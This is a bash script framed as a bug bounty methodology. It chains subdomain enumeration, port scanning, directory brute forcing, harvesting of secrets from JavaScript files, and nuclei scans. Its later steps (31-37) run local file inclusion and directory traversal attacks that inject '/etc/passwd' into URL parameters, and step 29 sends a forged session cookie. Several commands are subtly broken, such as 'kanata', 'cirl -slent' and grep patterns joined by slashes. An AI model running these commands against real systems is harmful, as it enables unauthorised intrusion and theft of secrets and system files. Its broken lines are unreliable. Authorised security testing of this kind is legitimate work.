#!/bin/bash

# Bug Bounty Methodology

# Reconnaissance and Subdomain Enumeration

# 1. Subdomain Enumeration with `subfinder`
subfinder -dL domains.txt -all -recursive -o subdomains.txt

# 2. Count the Number of Subdomains
cat subdomains.txt | wc -l

# 3. Fetch Subdomains from Certificate Transparency Logs
curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u  | anew subdomains.txt # Collect all levels of domains
curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' | anew subdomains.txt # Collect only of subdomains

# 4. Check Which Subdomains Are Alive with `httpx-toolkit`
cat subdomains.txt | httpx-toolkit -l subdomains.txt -ports 443,80,8080,8000,8888 -threads 200 > subdomains_alive.txt

# 5. Count the Number of Alive Subdomains
cat subdomains_alive.txt | wc -l

# Port Scanning and Service Detection

# 6. Port Scanning and Service Detection with `naabu`
naabu -list subdomains.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt

# Directory Brute Forcing and Parameter Extraction

# 7. Directory Brute Forcing with `dirsearch`
dirsearch -l subdomains_alive.txt -x 500,502,429,404,400 -R 5 --random-agent -t 100 -F -o directory.txt -w /usr/share/seclists/common.txt

# 8. Count the Number of Discovered Directories
cat directory.txt | wc -l

# 9. Extract Parameters from Alive Subdomains with `gau`
cat subdomains_alive.txt | gau > params.txt

# 10. Count the Number of Extracted Parameters
cat params.txt | wc -l

# 11. Filter Parameters with `uro`
cat params.txt | uro -o filterparam.txt

# 12. Count the Number of Filtered Parameters
cat filterparam.txt | wc -l

# JavaScript File Analysis and Secret Extraction

# 13. Find JavaScript Files
cat filterparam.txt | grep ".js$" > jsfiles.txt

# 14. Extract Unique JavaScript Files
cat jsfiles.txt | uro | anew jsfiles.txt

# 15. Count the Number of JavaScript Files
cat jsfiles.txt | wc -l

# 16. Extract Secrets from JavaScript Files with `SecretFinder`
cat jsfiles.txt | while read url; do python3 /SecretFinder.py -i $url -o cli >> secret.txt; done

# 17. Search for Specific Secrets in `secret.txt`
cat secret.txt | grep aws/username//account_id/heroku

# Vulnerability Scanning and Analysis

# 18. Run Nuclei Scans
nuclei -list filterparam.txt -c 70 -rl 200 -fhr -lfa -t /Nuclei-Template -o nuclei-target.txt -es info
nuclei -list sorted_param_10k.txt -c 70 -rl 200 -fhr -lfa -t /Nuclei-Template -o nuclei-target.txt -es info

# 19. Search Shodan for Target Information
# Example: ssl: 'target.com' 200
# Facet Analysis: ssl: 'target.com' 200 "http:status/title"

# Advanced Scanning and Enumeration

# 20. Additional Subdomain Enumeration and Checking
subfinder -d target.com -all -recursive > subdomains.txt
cat subdomains.txt | httpx-toolkit -ports 443,80,8080,8000,8888 -threads 200 > subdomains_alive.txt

# 21. URL and Parameter Extraction with `katana`
katana -u subdomains_alive.txt -d 5 -ps -pss -waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef wolf,css,png,svg,jpg,wolf2,jpeg,gif,svg -o allurls.txt

# 22. Count the Number of Extracted URLs
cat allurls.txt | wc -l

# 23. Filter for Specific File Types
cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
cat allurls.txt | grep -E "\.js$" >> js.txt

# 24. Run Nuclei Scan for JavaScript Exposures
cat js.txt | nuclei -t /Nuclei-Template/http/exposures/ -c 30

# 25. Run Nuclei Scan for Exposures from Google Search
echo www.target.com | kanata -ps | grep -E "\.js$" | nuclei -t /Nuclei-Template/http/exposures/ -c 30

# 26. Directory Brute Forcing on Specific URL
dirsearch -u https://www.validator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bkp,cache,cgi,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,sql,sql.gz,http://sql.zip,sql.tar,gz,sql~,swp,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js,.json

# 27. Subdomain Vulnerability Scanning with `subzy`
subzy run --targets subdomains_alive.txt --verify-ssl
# Optional: Increase concurrency and hide failures
# subzy run --targets subdomains_alive.txt --concurrency 100 --hide-fails --verify-ssl

# 28. Check for Specific Paths in Subdomains
cat subdomains.txt | grep dashboard
cat subdomains.txt | grep admin/beta/staging/dev/control/panel/api/old

# 29. Test CORS Misconfigurations
python3 corsy.py -i /subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION:Hacked"

# 30. Run Nuclei Scans for CORS and Other Tags
nuclei -list /subdomains_alive.txt -t /Priv8-Nuclei/cors
nuclei -list /subdomains_alive.txt -tags cves,osint,tech

# 31. Local File Inclusion Testing
cat allurls.txt | gf lfi | nuclei -tags lfi

# 32. Generate and Test Payloads
bash make-payloads.sh www.target.com
cat allurls.txt | gf redirect | openredirex -p /Open-Redirect/payloads/burp/www.target.com.txt

# 33. Check for CRLF Injection Vulnerabilities
cat subdomains.txt | nuclei -t /Priv8-Nuclei/crlf/crlf2.yaml -v
cat allurls.txt | gf redirect | openredirex

# 34. Google Dorks for Open Redirects
# Use Google Dorks to find open redirects
# Example: site:target.com inurl:redir |inurl: redirect | inurl:url | inurl:return | inurl:src=http | inurl:r=http | inurl:goto=http

# 35. Extract and Test JavaScript Files
subfinder -d target.com | httpx-toolkit | gau | uro | gf lfi | tee domains.txt
nuclei -list domains.txt -tags lfi
echo 'sub.target.com' | gau | uro | gf lfi
nuclei -target 'https://sub.target.com/home.php?page=about.php' -tags lfi
nuclei -target 'https://sub.other.com' -tags lfi

# 36. Directory Traversal Testing
dotdotpwn -m http-url -d 10 -f /etc/passwd -u "http://www.target.com?page=TRAVERSAL" -b -k "root:"
subfinder -d mylocal.life | httpx-toolkit | gau | uro | gf lfi | qsreplace "/etc/passwd" | while read url; do cirl -slent "$url" | grep "root:x:" && echo "$url is vulnerable"; done;

# 37. Parameter Spidering
paramspider -d vuln.target.com --subs
dotdotpwn -m http-url -d 10 -f /etc/passwd -u "http://www.target.com?page=TRAVERSAL" -b -k "admin:"
paramspider -d vuln.target.com --subs
